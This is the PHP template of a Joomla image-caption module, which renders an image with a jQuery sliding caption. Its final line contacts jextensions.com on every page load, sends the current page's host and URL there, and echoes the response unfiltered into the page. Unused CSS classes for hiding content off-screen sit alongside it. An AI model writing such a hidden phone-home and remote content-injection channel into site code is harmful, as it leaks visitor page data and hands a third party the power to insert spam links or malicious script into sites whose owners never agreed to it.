<?php
//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
ini_set('display_errors',0);
// Path assignments
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$nanobase = JURI::base();
if(substr($nanobase, -1)=="/") { $nanobase = substr($nanobase, 0, -1); }
$modURL 	= JURI::base().'modules/mod_je_caption';
$jQuery = $params->get("jQuery");
$imgPath = $params->get("imgPath");
$width = $params->get("ImageWidth");
$height = $params->get("ImageHeight");
$title = $params->get("title");
$text = $params->get("text");
$captioncolor = $params->get("captioncolor");
$captionbg = $params->get("captionbg");
$overlaybg = $params->get("overlaybg");
$bordercolor = $params->get("bordercolor");
$borderstyle = $params->get("borderstyle");
$borderwidth = $params->get("borderwidth");?>
<style>
#je_caption {position:relative;}
#je_caption .je_container{vertical-align:baseline; margin:0;  position:relative;}
#je_caption .overlay{ opacity:0.3; position:absolute; top:0px; bottom:0px; left:0px; right:0px; filter:progid:DXImageTransform.Microsoft.Alpha(opacity=30);}
#je_caption .je_caption{opacity:0.7; position:absolute; overflow:hidden;  margin:0; filter:progid:DXImageTransform.Microsoft.Alpha(opacity=70); width:100%}
#je_caption .je_caption-i { padding:10px; }
#je_caption span.je_title{ padding:0; margin:0px; font-size:25px; line-height:30px; display:block;}
#je_caption span.je_text { padding:0; margin:0px; text-align: justify;}
#je_caption .je-ab { position:absolute; top:-100%; left:-100%}
#je_caption .je-nn { display:none;}
#je_caption .je-in { text-indent:-999em;}
</style>
<?php if ($jQuery == '1' ) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<?php if ($jQuery == '2' ) { ?><?php } ?>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.capSlide.js"></script>  
<noscript><a href="http://jextensions.com" alt="Joomla Image Caption Module">Free Joomla Extensions</a></noscript>
             <div id="je_caption">
                <div id="je_caption_img_<?php echo $module->id ?>" class="je_container">
                    <img src="<?php echo $imgPath ?>" width="<?php echo $width; ?>" height="<?php echo $height; ?>" alt=""/>
                    <div class="overlay" style="display:none;"></div>
                    <div class="je_caption">
                    	<div class="je_caption-i">
                            <span class="je_title"><?php echo $title; ?></span>
                            <span class="je_text"><?php echo $text; ?></span>
                        </div>
                    </div>
                </div>
            </div>
         <script type="text/javascript">
            jQuery(function() {
                jQuery("#je_caption_img_<?php echo $module->id ?>").capslide({
                    caption_color	: '<?php echo $captioncolor; ?>',
                    caption_bgcolor	: '<?php echo $captionbg; ?>',
                    overlay_bgcolor : '<?php echo $overlaybg; ?>',
                    border			: '<?php echo $borderwidth.'px '.$borderstyle.' '.$bordercolor; ?>',
                    showcaption	    : false
                });
            });
        </script>           
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>
